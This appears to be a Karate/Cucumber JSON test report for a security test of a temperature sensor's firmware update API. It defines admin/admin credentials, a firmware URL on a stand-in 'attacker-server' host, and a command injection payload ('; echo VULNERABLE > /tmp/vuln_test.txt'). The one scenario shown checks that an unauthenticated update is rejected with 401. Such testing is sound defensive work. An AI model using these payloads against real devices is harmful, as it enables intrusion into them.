[{"line":1,"elements":[{"line":3,"name":"","description":"","type":"background","keyword":"Background","steps":[{"name":"url 'http:\/\/192.168.1.109:12384'","result":{"duration":1300600,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":4},{"name":"def validAuth = {username: 'admin', password: 'admin'}","result":{"duration":5204800,"status":"passed"},"match":{"location":"karate","arguments":[]},"comments":["# Using temperature-sensor-04 as example"],"keyword":"*","line":6},{"name":"def invalidAuth = {username: 'user', password: 'wrongpass'}","result":{"duration":1916300,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":7},{"name":"def validUpdatePayload = { \"firmware_url\": \"http:\/\/attacker-server:63999\/dummy.sh\", \"version\": \"1.2.3\" }","result":{"duration":9013300,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":8},{"name":"def commandInjectionPayload = { \"firmware_url\": \"http:\/\/attacker-server:63999\/dummy.sh\", \"version\": \"1.2.3\", \"params\": \"; echo VULNERABLE > \/tmp\/vuln_test.txt\" }","result":{"duration":1221400,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"*","line":9}]},{"start_timestamp":"2025-03-26T12:43:45.808Z","line":11,"name":"Attempt firmware update without authentication","description":"","id":"attempt-firmware-update-without-authentication","type":"scenario","keyword":"Scenario","steps":[{"name":"path '\/firmware\/update'","result":{"duration":2743900,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Given","line":12},{"name":"request validUpdatePayload","result":{"duration":1288000,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":13},{"name":"method post","result":{"duration":29745200,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"When","line":14,"doc_string":{"content_type":"","value":"14:43:45.836 request:\n1 > POST http:\/\/192.168.1.109:12384\/firmware\/update\n1 > Content-Type: application\/json; charset=UTF-8\n1 > Content-Length: 77\n1 > Host: 192.168.1.109:12384\n1 > Connection: Keep-Alive\n1 > User-Agent: Apache-HttpClient\/4.5.14 (Java\/11.0.17)\n1 > Accept-Encoding: gzip,deflate\n{\"firmware_url\":\"http:\\\/\\\/attacker-server:63999\\\/dummy.sh\",\"version\":\"1.2.3\"}\n\n14:43:45.858 response time in milliseconds: 21\n1 < 401\n1 < Content-Type: application\/json\n1 < Content-Length: 30\n1 < Server: Werkzeug\/2.0.1 Python\/3.9.21\n1 < Date: Wed, 26 Mar 2025 12:43:47 GMT\n{\n  \"error\": \"Unauthorized\"\n}\n\n\n","line":14}},{"name":"status 401","result":{"duration":15100,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"Then","line":15},{"name":"match response.error == 'Unauthorized'","result":{"duration":1830800,"status":"passed"},"match":{"location":"karate","arguments":[]},"keyword":"And","line":16}],"tags":[]}],"name":"ID_003_krtestoas_firmware_update_POST_verified.feature","description":"Test Temperature Sensor Firmware Update Vulnerability","id":"test-temperature-sensor-firmware-update-vulnerability","keyword":"Feature","uri":"ID_003_krtestoas_firmware_update_POST_verified.feature"}]